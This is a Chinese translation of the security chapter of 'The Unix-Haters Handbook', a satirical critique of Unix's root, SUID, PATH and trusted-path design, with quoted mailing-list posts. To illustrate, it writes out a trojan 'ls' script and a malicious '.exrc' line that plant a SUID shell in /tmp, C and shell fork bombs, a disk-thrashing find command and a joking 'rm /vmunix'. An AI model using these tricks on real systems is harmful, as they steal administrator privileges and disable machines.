# 安全：哦，抱歉，先生，请继续，我没意识到您是 root 用户


![](../.gitbook/assets/anquan.png)


> Unix 是计算机科学的“科学宗教”，而不是计算机科学。
>
> ——Dave Mankins

“Unix 安全”这一术语几乎本身就是个矛盾，因为 Unix 操作系统并非为了安全而设计，除了那个脆弱且设计不良的 root/rootless 区别。为了防止攻击而采取的安全措施都是事后的补救。因此，当 Unix 正常运行时，它并不安全，而让 Unix“安全地”运行则意味着强迫它做一些不自然的操作。这就像马戏团里跳舞的狗，但一点也不好笑——尤其是当被“狗”吃掉的是你的文件时。

## Unix 自相矛盾的安全世界

Unix 的诞生和演变排除了安全性的可能。它作为黑客的游乐场和其“工具包”哲学，与构建安全系统的需求深刻冲突。

### 安全不是一台行式打印机

Unix 实现计算机安全的方式，就像它实现其他操作系统服务一样。通过一组文本文件（例如 `.rhosts` 和 `/etc/groups`），使用标准的 Unix 编辑器进行编辑来控制安全配置。安全因此由一系列声称各司其职的小程序和操作系统内核中几个用来执行整体策略的技巧共同实现。

将配置文件和小型工具程序结合使用，在控制行式打印机时还算勉强管用，但应用到系统安全上则行不通。安全不是行式打印机：要让计算机安全有效，操作系统的所有方面都必须具备安全意识。

由于 Unix 缺乏统一的安全策略，每款可执行程序、每个配置文件以及每一个启动脚本都成为关键点。一个小错误，比如逗号写错、文件权限设置不当，都可能导致系统整个安全机制的灾难性失败。

Unix 的“程序员工具”哲学使得原本相对无害的安全漏洞组合起来，会演变成复杂的安全破坏系统。单个元素甚至可能被设置陷阱。因此，操作系统的每一部分都必须单独检查，同时还要与其他部分结合起来审查，确保没有安全漏洞。

“安全运行的 Unix 系统”不过是等待发生事故的意外。换句话说，唯一安全的 Unix 系统，就是关闭电源的那台。

## 护甲上的漏洞

两个根本性的设计缺陷阻碍了 Unix 的安全性。首先，Unix 将关于计算机的安全信息存储在计算机内部，且没有加密或其他数学保护措施。这就像把保险箱的钥匙随意放在桌面上一样：一旦攻击者突破了 Unix 的大门，整个系统就被攻破了。其次，Unix 的超级用户概念本身就是一处根本上的安全弱点。几乎所有的 Unix 系统都配备了一位特殊用户，称为 root，它能绕过所有安全检查，拥有对系统的完全控制权限。超级用户可以删除任何文件、修改任何程序，或者更改任何用户的密码，而不会留下任何审计痕迹。

## 超级用户：超级缺陷

所有多用户操作系统都需要特权账户。几乎所有非 Unix 的多用户操作系统都会根据需求分配特权。而 Unix 的“超级用户”是全有或全无的。一个能够更改用户密码的管理员，按设计也必须能够删除系统上的所有文件。你雇来做备份的那个高中生可能会无意中（或者故意）让你的系统暴露在攻击风险中。

许多 Unix 程序和工具都需要超级用户权限。复杂且有用的程序需要创建文件或写入用户本身无权访问的目录。为了确保安全，以超级用户身份运行的程序必须经过严格审查，确保它们没有意外的副作用，也没有可以被利用以获取未授权超级用户访问权限的漏洞。不幸的是，这种安全审计程序很少执行（例如，大多数第三方软件供应商不愿意向客户披露其源代码，因此即使想进行审计，这些公司也无法做到）。

#### SUID 之殇

Unix 中称为 SUID（或 setuid）的概念带来了与超级用户同样多的安全问题。SUID 是一处内置的安全漏洞，它能让普通用户运行需要特殊权限的命令。运行时，SUID 程序会假定安装该程序的用户的权限，而不是运行程序的用户的权限。大多数 SUID 程序都是以 SUID root 身份安装的，因此它们以超级用户权限运行。

Unix 操作系统的设计者让我们相信，SUID 是高级操作系统的基本要求。最常见的例子是 `/bin/passwd`，这是 Unix 中允许用户更改密码的程序。`/bin/passwd` 通过修改 `/etc/passwd` 文件的内容来更改用户密码。普通用户不能直接修改 `/etc/passwd`，否则他们就能更改彼此的密码。`/bin/passwd` 程序由普通用户运行时，会假定超级用户权限，并且只被构造用来修改运行该程序用户自己的密码，而不会修改其他人的密码。

不幸的是，当 `/bin/passwd` 以超级用户身份运行时，它不仅有权限修改 `/etc/passwd` 文件，还能修改任何文件，实际上可以做任何事情（毕竟它是以 root 身份运行，没有安全检查）。如果它在运行时被攻破——例如，如果它被诱导创建子 shell——攻击者就可以继承这些超级用户权限，从而控制系统。AT\&T 对 SUID 概念非常满意，甚至为其申请了专利。设计初衷是让 SUID 简化操作系统设计，从而避免需要一个负责系统安全所有方面的单一整体子系统。经验表明，Unix 大部分安全漏洞都来自于 SUID 程序。

当与可移动介质（如软盘或 SyQuest 驱动器）结合使用时，SUID 给攻击者提供了一种强大的方式来突破本应“安全”的系统：只需将一个 SUID root 文件放到软盘上并挂载，然后运行该 SUID root 程序即可获得 root 权限。（熟悉 Unix 的读者可能会反对这个攻击，指出 `mount` 是一个需要超级用户权限运行的特权命令。不幸的是，许多厂商现在专门提供了用于挂载可移动介质的 SUID 程序，以缓解这个“不便”。）

SUID 不仅限于超级用户——任何程序都可以被设置为 SUID，任何用户都可以创建 SUID 程序以在运行时获取该用户的权限（无需让任何人输入该用户的密码）。实际上，SUID 是一款强大的工具，用来构建窃取其他用户权限的陷阱，后面我们还会看到更多例子。

### 布谷鸟蛋（隐蔽的恶意软件）

作为可能出错的一个例子，想一下 Cliff Stoll 出色著作《杜鹃蛋：电脑间谍案曝光录》中的一个案例。Stoll 讲述了一群位于西德的计算机破解者如何利用一款名为 movemail 的看似无害的实用程序中的“漏洞”，入侵了遍布美国和欧洲的许多计算机。这个 movemail 是为流行的 Unix 编辑器 Emacs 编写的。

最初编写时，movemail 只是将用户邮箱中 `/usr/spool/mail` 的电子邮件移动到用户的主目录。到此为止，一切正常：没有问题。但后来该程序在 1986 年被 MIT Athena 项目的 Michael R. Gretzinger 修改。Gretzinger 希望使用 movemail 从 Athena 运行的基于 POP（互联网邮局协议）的电子邮件系统中获取邮件。为了使 movemail 能正确与 POP 协作，Gretzinger 发现必须将该程序安装为 SUID root。你甚至可以在 movemail 的源代码中找到 Gretzinger 的注释：


```c
/*
* 1986 年 1 月由 Michael R. Gretzinger（Athena 项目）修改
*
* 增加了 POP（邮局协议）服务。编译时使用 -DPOP，
* movemail 将接受形如 "po:username" 的输入文件名参数。
* 这将使 movemail 连接到运行在 $MAILHOST（环境变量）上的 pop 服务器。
* movemail 必须设置为 SUID root 才能与 POP 配合工作。
*
* ...
*/
```

原版 movemail 作者从未预料到该程序有一天会以 SUID root 身份运行。问题就在于，当程序以 root 身份运行时，它能让正在移动邮件的用户读取或修改整个系统上的任何文件。Stoll 讲述的那群西德计算机黑客正是利用了这个漏洞，在他们的克格勃（KGB）控制者指挥下，侵入了美国和欧洲的军事计算机。

最终，这个漏洞被修复了。以下是防止此次入侵的三行补丁代码：


```c
/* 检查对输出文件的访问权限。 */
if (access(outname, F_OK) == 0 &&
    access(outname, W_OK) != 0)
    pfatal_with_name(outname);
```

这并不是一个难修补的补丁。问题在于 movemail 本身有 838 行代码——而 movemail 只是一个近 10 万行代码的大程序中的微不足道的一部分。谁又能在安装之前审计完这些代码并发现这个漏洞呢？


### SUID 的又一处问题


SUID 还有一处问题：它赋予用户制造混乱的能力，但却没有赋予他们清理混乱的权限。这个问题可能非常烦人。SUID 程序通常是为了执行需要特殊权限的操作而设定的。当它们开始出问题，或者你不小心运行了错误的程序时，你需要一种办法来终止它。但如果你自己没有超级用户权限，那你就没辙了：

> 日期：1989 年 10 月 22 日 星期日 01:17:19 EDT
>
> 发件人：Robert E. Seastrom [rs@ai.mit.edu](mailto:rs@ai.mit.edu)
>
> 收件人：Unix 痛恨者
>
> 主题：该死的 setuid
>
> 今晚我正在收集一些关于向一个可能不太稳定的网关另一边的主机发送 `echo` 时间的信息。因为我不想坐在那里等半个小时，每 5 秒 `ping` 一次那个主机，所以我决定：
>
> ```sh
> % ping -t5000 -f 60 host.domain > logfile &
> ```
>
> 这有什么问题呢？事实证明，`ping` 是一款 setuid root 程序，而当我用完它之后，我根本杀不了这个进程，因为 UNIX 说这不是我能杀的进程！所以我想，“没问题，我退出登录然后再登录，它应该会接收到 SIGHUP 信号然后结束，对吧？”错了。它依然在那里，现在我彻底完蛋了，因为我连把它切换到前台（fg）都做不了！所以我不得不去找有 root 权限的人帮我杀掉它！为什么 Unix 不能明白，如果一个进程的父进程 ID（ppid）是你 shell 的进程 ID（pid），那么这个进程就是你的，你可以随便对它做任何事情？
>
> Unix 今日安全小贴士：
>
> 你可以通过以 root 身份登录并输入以下命令，大大降低了被黑客入侵和病毒感染的风险——
>
> ```sh
> % rm /vmunix
> ```

### 进程既廉价又危险


另一个破坏 Unix 安全的工具是系统调用 `fork()` 和 `exec()`，它们能让一个程序生成其他程序。程序生成子程序是 Unix 工具哲学的核心。比如 Emacs 和 FTP 会运行子进程来完成诸如列出文件这样的特定任务。对安全意识强的人来说，问题在于这些程序继承了生成它们的程序的权限。

容易生成的子进程是一把双刃剑，因为生成的子程序可能是 shell，从而放下城门，让蒙古大军入侵。当生成程序以超级用户身份运行时，它生成的进程也以超级用户身份运行。许多攻击者正是通过生成的超级用户 shell 进入系统。

事实上，“互联网蠕虫”（后面章节会讨论）就是通过运行网络服务器，并说服它们生成子 shell 进入毫无防备的计算机。为什么这些网络服务器拥有生成子 shell 的操作系统权限，而它们在正常运行时根本不需要生成子 shell？因为每个 Unix 程序都有这个能力；没有办法拒绝某程序（或者某用户）生成子 shell 的权限。

### PATH 之踵

Unix 需要找到与给定命令名称对应的可执行文件。为此，Unix 会查看用户的 `PATH` 变量中列出的目录。例如，如果你的 `PATH` 环境变量是 `:/bin:/usr/bin:/etc:/usr/local/bin:`，那么当你输入命令 `snarf` 时，Unix 会按顺序自动在 `/bin`、`/usr/bin`、`/etc` 和 `/usr/local/bin` 目录中搜索名为 `snarf` 的程序。

到目前为止，一切正常。然而，像下面这样的 `PATH` 变量设置是常见的灾难：

```ini
PATH=:.:/bin:/usr/bin:/usr/local/bin:
```

将 `.` —— 当前目录 —— 作为第一个元素，指示 Unix 在搜索命令时先搜索当前目录，然后再搜索 `/bin` 等目录。虽然这在开发新程序时非常方便，但也是一种强大的安全破坏技巧，可以为其他用户布下陷阱。

假设你是某所垃圾大学里的学生，学校不允许你拥有超级用户权限。你可以在你的家目录里创建名为 `ls` 的文件 [^1]，内容如下：

```sh
#!/bin/sh  # 启动 shell。
/bin/cp /bin/sh /tmp/.sh1  # 将 shell 程序复制到 /tmp。
/etc/chmod 4755 /tmp/.sh1  # 赋予它调用 ls 命令者的权限。
/bin/rm \$0  # 删除该脚本自身。
exec /bin/ls \$1 \$2 \$3 \$4  # 运行真正的 ls 命令。
```

接下来，你去找系统管理员，告诉他你在家目录里找不到某个文件。如果管理员头脑简单，他会在终端输入以下两行命令：

```sh
% cd <你的家目录>
% ls
```

此时，你已经“抓住”了他，他却浑然不觉。当他输入 `ls` 命令时，运行的不是 `/bin/ls`，而是你家目录中特意创建的 `ls` 程序。这个恶意的 `ls` 程序会在 `/tmp` 目录放置一款具有 SUID 权限的 shell 程序，当运行时，该 shell 会继承管理员的所有权限。

虽然管理员会觉得你很傻，但实际上他才是那个“傻子”。你可以随意运行新建的 `/tmp/.sh1`，无需知道他的密码或登录身份，就能读取、删除或运行他的任何文件。如果管理员有访问 SUID root shell 程序（通常名为 `doit`），你也同样拥有。恭喜你，整个系统完全掌握在你手中。

[^1]: 你自己可别这么试！

### 启动陷阱

当一款复杂的 Unix 程序启动时，它会从用户的家目录/当前目录读取配置文件，以设置初始和默认参数，从而根据用户的需求定制程序。不幸的是，启动文件可能被其他用户创建并留在那里，代替他们为你执行命令。

一处非常著名的启动陷阱针对的是 vi，这个简单、快速、面向屏幕的编辑器深受许多系统管理员喜爱。可惜的是，vi 不能同时编辑多个文件，因此系统管理员经常从当前目录启动 vi，而不是从家目录启动。

问题就在这。

启动时，vi 会在当前目录中搜索一个名为 `.exrc` 的文件，这是 vi 的启动文件。想偷点权限吗？就在某个目录放一个名为 `.exrc` 的文件，内容如下：

```ini
!(cp /bin/sh /tmp/.s$$;chmod 4755 /tmp/.s$$)&
```

然后等待一个毫无防备的系统管理员从该目录调用 vi。当她这样做时，屏幕底部会短暂闪现一个感叹号，而你将在 `/tmp` 目录下得到一个 SUID shell，和之前的攻击一样。


### 可信路径与特洛伊木马

标准 Unix 没有提供可信路径（trusted path）到操作系统。我们用一个例子来解释这个概念。考虑标准的 Unix 登录过程：

```sh
login: jrandom
password: <输入你的“秘密”密码>
```

当你输入密码时，你怎么知道你输入的是正儿八经的 Unix `/bin/login` 程序，而不是某个狡诈的冒名顶替者？这种冒名顶替者被称为“特洛伊木马”，在破解者的公告板上随处可见；它们的唯一目的是捕获你的用户名和密码，以供后来可能的非法使用。

可信路径是计算机安全的基本要求，但在大多数 Unix 版本中理论上是不可能实现的：`/etc/getty`（负责请求你的用户名）和 `/bin/login`（负责请求你的密码）与任何其他程序没有区别。它们只是程序。它们恰巧是要求你输入高度机密和敏感信息以验证你身份的程序，但你没有任何方法去验证它们的真实性。

### 祸不单行

>Unix 安全坐在墙上，
>
>Unix 安全遭遇大坠落。
>
>所有国王的战马，
>
>以及所有国王的士兵，
>
>都无法重新恢复安全。


重新保护一款被攻破的 Unix 系统非常困难。入侵者通常会留下启动陷阱、后门和特洛伊木马。发生安全事件后，通常重装操作系统比收拾残局更容易。

例如，MIT 最近曾有一台计算机被攻破。攻击者最终被发现，他最初的入侵漏洞被关闭。但系统管理员（一位 Unix 大师）没有意识到攻击者已经修改了计算机上的 `/usr/ucb/telnet` 程序。在接下来的六个月里，每当该计算机上的用户使用 telnet 连接 MIT 内部的其他计算机或互联网的任何地方时，Telnet 程序会将远程计算机上的用户名和密码捕获并保存到本地文件中。这个攻击被发现仅仅是因为计算机硬盘空间因为存储大量用户名和密码而耗尽。

攻击者轻易隐藏他们的踪迹。在入侵 Unix 后，攻击者会编辑日志文件以抹去任何入侵痕迹。许多系统管理员通过检查文件修改日期来检测未经授权的修改，但获得超级用户权限的攻击者可以重新设置系统时钟——他们甚至可以使用 Unix 提供的专门更改文件时间的函数。

Unix 文件系统充满了保护机制和权限位。如果单个文件、目录或设备的权限位设置错误，就会威胁整个系统的安全。这是一个双重打击，使得经验丰富的攻击者相对容易攻破大多数 Unix 系统，而一旦攻破了系统，也相对容易创建后门以便未来再次入侵。

### 诡异的加密

加密是计算机安全的重要组成部分。遗憾的是，Unix 并未内置自动加密硬盘上文件的系统。当有人盗取了你 Unix 计算机的硬盘驱动器（或备份磁带）时，无论用户密码设置得多么安全，攻击者只需将硬盘连接到另一台系统上，你系统中的所有文件便暴露无遗（可以把这看作对“开放系统”口号的新定义）。

大多数版本的 Unix 附带了名为 `crypt` 的加密程序。但在很多方面，使用 `crypt` 比根本不用加密程序还要糟糕。使用 `crypt` 就像给心脏病发作的人服用两粒阿司匹林一样无效。

`crypt` 的加密算法极其脆弱——如此脆弱，以至于几年前，麻省理工学院人工智能实验室的一名研究生写了一款程序，能够自动解密用 `crypt` [^2] 加密的数据文件。

我们不知道为什么贝尔实验室会决定将 `crypt` 与最初的 Unix 系统一同发布。但我们知道该程序的作者们很清楚它实际上有多么弱和不可靠，这一点从他们在程序手册页中的反常免责声明中可见一斑：

> BUGS：对于所附材料的适销性、特定用途的适用性，或其准确性，既无明示也无暗示的任何保证。因此，贝尔电话实验室对接收者使用这些材料不承担任何责任。此外，贝尔实验室也不承担提供任何形式的协助，或提供任何额外信息或文档的义务。

一些较新的 Unix 版本包含一款名为 `des` 的程序，使用美国国家安全局的数据加密标准（DES）进行加密。尽管 DES（算法本身）相当安全，但 `des`（程序本身）却不安全，因为 Unix 没有提供任何工具来让程序在执行前验证 `des` 的真实性。当你运行 `des`（程序本身）时，无法确认它是否被篡改用来偷偷保存你的宝贵加密密钥，或者是否在将所有加密内容通过电子邮件发送给第三方。


[^2]: Paul Rubin 写道：“如果你不小心使用了某些版本的 ed 编辑器中的‘x’命令（加密文件），而你本以为是在使用其他版本 ed 中的‘x’命令（调用迷你屏幕编辑器），这程序就能救你一命。当然，你直到为时已晚才发现。你随机敲击一堆键，想弄明白系统为什么似乎卡住了（你没意识到系统关闭了回显，让你可以输入秘密加密密钥），但敲完回车后，编辑器又正常保存你的工作，于是你耸耸肩继续干活……然后很久以后你写出文件并退出时，才发现文件是加密写出的——而且你根本不可能重新输入当时无意间乱敲的随机密码。我见过有人花好几个小时试图以第一次的敲击方式精准敲键盘，因为这是他们唯一能找回文件的希望。这些人根本没想到 `crypt` 加密是如此容易被破解。”


### 隐藏文件的麻烦

Unix 的 `ls` 程序默认会隐藏以句点（`.`）开头的文件（比如 `.cshrc` 和 `.login`），在目录列表中不显示这些文件。攻击者利用这一“特性”，通过给系统破坏工具起以句点开头的名字来隐藏它们。电脑破解者曾在毫无戒心的用户目录里藏匿了数兆字节的信息。

使用包含空格或控制字符的文件名是另一种强大的隐藏文件技巧。大多数信任系统的用户（可能是从 Mac 或 MS-Windows 迁移过来的）看到自己家目录里有个叫 `system` 的文件时不会多想——尤其当他们尝试用 `rm system` 删除它却失败时。“如果删不掉它，”他们会想，“那肯定是因为 Unix 被修补过，特意不让删这个关键系统资源。”

他们也不能被责怪，因为文档里根本没提到这个“system”目录：Unix 有很多东西都没有写进文档。他们怎么会知道目录名字后面带了一个空格，这才是删不掉它的原因？他们又怎么会知道里面藏着从华盛顿沃拉沃拉县的 AT\&T 电脑盗来的法律文件？而且他们为什么要关心？安全问题是系统管理员的事，不是他们的。

### 拒绝服务

拒绝服务攻击使计算机对其他用户变得无法使用，但不一定能获取特权信息。与其他操作系统不同，Unix 对拒绝服务攻击内置的防护措施非常有限。Unix 诞生于研究环境，在那里能让用户充分利用计算机资源比防止彼此占用 CPU 时间或文件配额更为重要。

如果你在一台 Unix 计算机上有账户，可以通过编译并运行以下程序使系统瘫痪：

```c
main()
{
  while(1){
    fork();
  }
}
```

该程序不断调用 `fork()`（用于创建新进程的系统调用）。第一次循环时，一个进程克隆了自己；第二次循环时，两个进程各自克隆自己，总共四个进程；接下来，八个进程不断克隆自身，进程数呈指数增长，直到 Unix 系统无法再创建更多进程。此时，约有三十到六十个进程持续调用 `fork()`，却只能收到无法创建新进程的错误信息。该程序保证任何 Unix 计算机都会被彻底拖垮，无论是桌面 PC 还是 Unix 大型机。

甚至不需要 C 编译器，也能利用 Unix shell 的可编程性发动类似攻击，代码如下：

```sh
#!/bin/sh
$0 &
exec $0
```

这两种攻击都非常巧妙：一旦发动，唯一恢复系统控制的办法就是直接断电，因为此时无法运行 `ps` 命令查看攻击进程的进程号！（没有剩余进程了）。甚至无法使用 `su` 命令切换到超级用户！（同样没有进程）。如果你使用的是 sh，连 `kill` 命令都不能执行，因为执行它需要创建新进程。更妙的是，任何 Unix 用户都可以发动这种攻击。

（公平地说，一些 Unix 版本确实实现了每用户进程数限制。这个限制虽然防止了攻击用户锁死系统用户账号，但仍不能阻止系统被严重拖垮。因为 Unix 没有针对每用户的 CPU 时间配额。假如每用户进程限制为 50，攻击用户的 50 个进程很快就会占满系统资源，使其无法正常工作。）


### 系统使用情况未被监控

你是否遇到过 Unix 电脑莫名其妙地变慢？你向驻场的 Unix 高手抱怨（假设你还没麻木到把这类现象当成常态），他会敲下一串魔法般的命令，然后吐出一句神秘的话：“Sendmail 暴走了。我杀掉它了。现在应该没事了。”

Sendmail 暴走了？你以为他在开玩笑。但可悲的是，他不是。Unix 有时甚至不需要外部攻击就能自我瘫痪，就像那些淡季放火的消防员。Sendmail 就是罪魁祸首之一：有时，毫无缘由地，一个 sendmail 进程就会开始大量消耗 CPU 时间。无助的系统管理员唯一能做的就是杀掉这个进程，然后祈祷下次“运气好一点”。

你觉得这还不够刺激？那么来点更精彩的：多亏了 Unix 网络系统的设计缺陷，你甚至无需登录远程系统，就能让网络上的任意 Unix 计算机瘫痪。你只需要写一个程序，对远程机器上的 sendmail 守护进程发起 50 个连接，然后向这些管道中发送一堆垃圾数据。远程机器上的用户就会突然遭遇莫名其妙的系统变慢。如果这些随机数据让 sendmail 崩溃并生成 core dump，目标机器的性能会进一步恶化。

这就是 Unix 的“正常行为”。

### 磁盘过载

还有一种攻击方式可以让 Unix 瘫痪，甚至不需要耗尽 CPU，这多亏了 Unix 在磁盘和网络活动上的原始设计。这种攻击方法非常简单：只要启动四到五个 `find` 任务，像这样让它们在文件系统上疯狂扫描：

```sh
% repeat 4 find / -exec wc {} \;
```

每个 `find` 进程都会读取文件系统上所有可读文件的内容，从而冲掉操作系统的所有磁盘缓存。几乎瞬间，Unix 系统就陷入瘫痪。

这方法既简单又干净利落，而且对于那些从这种行为中获得快感的用户，没有任何有效的防范手段。


## 蠕虫爬进来了

1988 年 11 月，一种电子寄生物（“蠕虫”）瘫痪了美国各地成千上万台工作站和超级小型计算机。这只蠕虫是通过一个名为互联网的广域计算机网络发动攻击的。新闻报道将这次所谓“互联网蠕虫”事件的责任完全归咎于康奈尔大学的一名研究生 Robert T. Morris。他释放这只蠕虫，既像是一场恶作剧，也像是一场大规模实验。陪审团裁定他犯有编写一款会“攻击”网络系统并“窃取”密码的计算机程序的罪行。

但“互联网蠕虫”事件中真正的罪犯并不是 Robert Morris，而是 Unix 操作系统的作者和厂商多年来对计算机安全问题的忽视。Morris 的蠕虫并不是靠什么狡诈、隐蔽或侦探手段进行攻击，而是利用了 Unix 操作系统中两个众所周知的漏洞——这两个漏洞从 Unix 的设计本身就根深蒂固。Morris 的程序根本不是一只“互联网蠕虫”。毕竟，它根本不会攻击运行 VMS、ITS、Apollo/Domain、TOPS-20 或 Genera 的互联网计算机。它是一只纯粹的 Unix 蠕虫。

其中一个被利用的网络程序叫做 sendmail，是由 Sun Microsystems 和数字设备公司（DEC）分发的，其中包含一款叫做 DEBUG 的特殊命令。所有通过网络连接到 sendmail 程序并发送 DEBUG 命令的人，都可以诱使 sendmail 程序生成子 shell。

Morris 蠕虫还利用了 finger 程序中的一个漏洞。通过向 finger 服务器 fingerd 发送伪造的信息，它迫使计算机执行一系列命令，最终生成一个子 shell。如果 finger 服务器不能生成子 shell，Morris 蠕虫充其量也只能导致 Finger 程序崩溃，而不会生成突破安全防线的子 shell。

>日期：1988 年 11 月 15 日 星期二 13:30 EST
>
>发件人：Richard Mlynarik [mly@ai.mit.edu](mailto:mly@ai.mit.edu)
>
>收件人：Unix 痛恨者
>
>主题：操作系统中的切尔诺贝利
>
>【我敢打赌，那些在 sendmail 蠕虫上大放厥词的傻瓜们所“浪费”的“宝贵研究时间”，远远超过了蠕虫入侵本身“造成”的损失。那些计算机科学的“研究者”无非是在写越来越复杂的屏保程序，或是读新闻组罢了。】
>
>>日期：1988 年 11 月 11 日 15:27 GMT+0100
>>
>>发件人：Klaus Brunnstein [brunnstein@rz.informatik.uni-hamburg.dbp.de](mailto:brunnstein@rz.informatik.uni-hamburg.dbp.de)
>>
>>收件人：[RISKS-LIST@KL.SRI.COM](mailto:RISKS-LIST@KL.SRI.COM)
>>
>>主题：Unix 不安全性（超越病毒蠕虫）
>>
>>【……一些零碎的安全问题……】
>>
>>虽然蠕虫病毒显然只造成了有限的损害（尤其是在那 16 小时的夜班中“吞噬”了时间与智力，并且还在随后的讨论中继续造成干扰，但也教会了一些宝贵的教训），但 Unix 狂热带来的后果可能会损害企业和经济。对我这个受过训练的物理学家而言，这让我联想到核物理学界对风险的忽视所引发的讨论。因此，我稍微修改了 Peter Neumann 所作的三哩岛与切尔诺贝利事故类比：蠕虫病毒的出现或许可以比作一个小型的三哩岛事故（威胁巨大但损害有限），但如果那些没有判断力的顾客听信计算机工业的建议而投身于不安全的 Unix 世界，那么在经济应用中，“计算机领域的切尔诺贝利”就正在被编写出来。
>>
>>——Klaus Brunnstein
>>
>>德国汉堡大学


